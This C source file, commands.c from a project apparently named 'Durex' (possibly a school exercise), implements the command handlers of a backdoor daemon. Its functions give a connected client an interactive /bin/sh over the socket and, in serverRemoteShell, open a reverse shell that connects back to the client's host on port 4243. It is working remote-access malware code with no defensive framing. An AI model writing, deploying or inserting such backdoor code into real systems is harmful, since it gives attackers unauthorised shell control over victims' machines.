/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   commands.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
/*   Updated: 2018/08/17 21:03:32 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* wait */
#include <wait.h>
/* exit */
#include <stdlib.h>
#include <errno.h>

#include "durex.h"

void			serverHelp(t_cl *client, t_cmd *cmds)
{
	serverLog("[CMDS] - %d: Help wanted.", client->fd);
	for (size_t i = 0; cmds[i].name; i++) {
		clientWrite(cmds[i].name, client);
		clientWrite(": ", client);
		clientWrite(cmds[i].def, client);
		clientWrite("\n", client);
	}
}

void			serverShell(t_cl *client, t_cmd *cmds)
{
	pid_t		pid;

	(void)cmds;
	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
	clientWrite("Spawning shell...\n", client);
	pid = fork();
	if (pid < 0)
		clientWrite("Failed to fork a new shell\n", client);
	else if (pid == 0) {
		char		*cmd[3];

		dup2(client->fd, STDIN_FILENO);
		dup2(client->fd, STDOUT_FILENO);
		dup2(client->fd, STDERR_FILENO);
		cmd[0] = "/bin/sh";
		cmd[1] = "-i";
		cmd[2] = NULL;
		execv(cmd[0], cmd);
		exit(0);
	}
}

void				serverRemoteShell(t_cl *client, t_cmd *cmds)
{
	pid_t			pid;
	struct addrinfo	*res;
	struct addrinfo	hints;
	struct addrinfo	*tmp;
	int				fd;

	(void)cmds;
	serverLog("[CMDS] - %d: Reverse Shell wanted.", client->fd);
	clientWrite("Spawning reverse remote shell...\n", client);
	mymemset(&hints, 0, sizeof(hints));
	hints.ai_flags = AI_PASSIVE;
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_canonname = NULL;
	hints.ai_addr = NULL;
	hints.ai_next = NULL;
	if ((fd = getaddrinfo(client->addr, "4243", &hints, &res))) {
		clientWrite("Failed to connect to server.\n", client);
		return serverLog("[ERRO] - %s", gai_strerror(fd));
	}
	tmp = res;
	while (tmp != NULL)
	{
		fd = socket(tmp->ai_family, tmp->ai_socktype, tmp->ai_protocol);
		if (fd < 0)
			continue ;
		if (connect(fd, tmp->ai_addr, tmp->ai_addrlen) == 0)
			break ;
		close(fd);
		fd = -1;
		tmp = tmp->ai_next;
	}
	freeaddrinfo(res);
	serverLog("[INFO] - fd:%d tmp:%s", fd, (tmp == NULL) ? "OK":"KO");
	if (tmp == NULL || fd < 0) {
		clientWrite("No server found on port 4243.\n", client);
		if (!tmp)
			serverLog("[ERRO] - Failed to connect to %s:%s (No server found)",
					  client->addr, "4243");
		else
			serverLog("[ERRO] - %s", strerror(errno));
		return ;
	}
	serverLog("[CMDS] - Connection to %s on %s succeeded.", client->addr, "4243");
	close(client->fd);
	client->fd = fd;
	pid = fork();
	if (pid < 0)
		clientWrite("Failed to fork a new shell\n", client);
	else if (pid == 0) {
		char		*cmd[3];
		
		dup2(client->fd, STDIN_FILENO);
		dup2(client->fd, STDOUT_FILENO);
		dup2(client->fd, STDERR_FILENO);
		cmd[0] = "/bin/sh";
		cmd[1] = "-i";
		cmd[2] = NULL;
		execv(cmd[0], cmd);
		exit(0);
	}
}

void			serverQuitClient(t_cl *client, t_cmd *cmds)
{
	(void)cmds;
	serverLog("[CMDS] - %d: Client quit.", client->fd);
	close(client->fd);
	client->fd = -1;
}
